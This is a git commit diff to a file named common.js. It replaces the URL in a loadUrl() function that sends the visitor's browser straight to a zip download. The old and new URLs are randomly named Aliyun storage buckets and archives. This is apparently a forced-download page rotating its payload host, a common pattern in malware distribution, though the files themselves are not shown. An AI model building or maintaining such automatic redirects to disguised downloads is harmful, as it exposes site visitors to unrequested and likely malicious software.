7295c6eccb3a03d83645e36352cb3a74e0744bce
kanyesee <ingle82751@gmail.com>
2025-07-02 22:11:40 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://wkhbucxw.oss-cn-hongkong.aliyuncs.com/HloihWkeiow9.2.4-x64.zip";
+		var url="https://lswknvxw.oss-cn-hongkong.aliyuncs.com/Ksdwalawfca.zip";
 		window.location=url;
 	}
 }
